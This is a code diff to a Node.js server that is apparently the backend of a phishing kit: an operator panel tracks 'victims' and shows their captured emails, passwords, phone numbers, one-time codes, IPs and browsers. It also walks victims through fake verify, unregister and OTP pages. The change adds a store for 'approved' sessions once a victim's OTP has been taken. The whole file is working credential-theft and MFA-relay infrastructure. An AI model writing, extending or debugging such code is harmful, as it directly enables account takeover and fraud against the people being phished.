@@ -38,6 +38,7 @@ app.use(session({
 /* ----------  STATE  ---------- */
 const sessionsMap     = new Map();
 const sessionActivity = new Map();
+const approvedSessions = new Map(); // NEW: Store approved sessions separately
 const auditLog        = [];
 let victimCounter     = 0;
 let successfulLogins  = 0;
@@ -116,6 +117,23 @@ function cleanupSession(sid, reason, silent = false) {
   if (!v) return;
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
+}
+
+function approveSession(sid) {
+  const v = sessionsMap.get(sid);
+  if (!v) return;
+  
+  // Move to approved sessions
+  v.approvedAt = Date.now();
+  v.status = 'approved';
+  approvedSessions.set(sid, v);
+  
+  // Remove from active sessions
+  sessionsMap.delete(sid);
+  sessionActivity.delete(sid);
+  
+  successfulLogins++;
+  emitPanelUpdate();
 }
 
 /* ----------  VICTIM API  ---------- */
@@ -257,8 +275,6 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-// REMOVED: /api/exit endpoint - tab close detection removed
-
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
   if (!v) return res.json({ status: 'gone' });
@@ -296,21 +312,34 @@ app.get('/api/user', (req, res) => {
 
 // helper that builds the payload
 function buildPanelPayload() {
-  const list = Array.from(sessionsMap.values()).map(v => ({
+  const activeList = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
     ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
     entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
+  
+  // Build approved sessions list - sorted by approval time (newest first)
+  const approvedList = Array.from(approvedSessions.values())
+    .sort((a, b) => b.approvedAt - a.approvedAt)
+    .map(v => ({
+      sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
+      email: v.email, password: v.password, phone: v.phone, otp: v.otp,
+      ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
+      entered: v.entered, unregisterClicked: v.unregisterClicked, approvedAt: v.approvedAt,
+      activityLog: v.activityLog || []
+    }));
+  
   return {
     domain: currentDomain,
     username: PANEL_USER,
     totalVictims: victimCounter,
-    active: list.length,
-    waiting: list.filter(x => x.status === 'wait').length,
+    active: activeList.length,
+    waiting: activeList.filter(x => x.status === 'wait').length,
     success: successfulLogins,
-    sessions: list,
+    sessions: activeList,
+    approvedSessions: approvedList,
     logs: auditLog.slice(-50).reverse()
   };
 }
@@ -331,6 +360,18 @@ app.post('/api/panel', async (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
   const { action, sid } = req.body;
+  
+  // Check if session is in approved sessions
+  if (approvedSessions.has(sid)) {
+    const v = approvedSessions.get(sid);
+    if (action === 'delete') {
+      approvedSessions.delete(sid);
+      emitPanelUpdate();
+      return res.json({ ok: true });
+    }
+    return res.json({ ok: false, error: 'Session already approved' });
+  }
+  
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
 
@@ -349,7 +390,12 @@ app.post('/api/panel', async (req, res) => {
       if (v.page === 'index.html') v.page = 'verify.html';
       else if (v.page === 'verify.html') v.page = 'unregister.html';
       else if (v.page === 'unregister.html') v.page = 'otp.html';
-      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
+      else if (v.page === 'otp.html') { 
+        v.page = 'success'; 
+        // Move to approved instead of just incrementing
+        approveSession(sid);
+        return res.json({ ok: true });
+      }
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
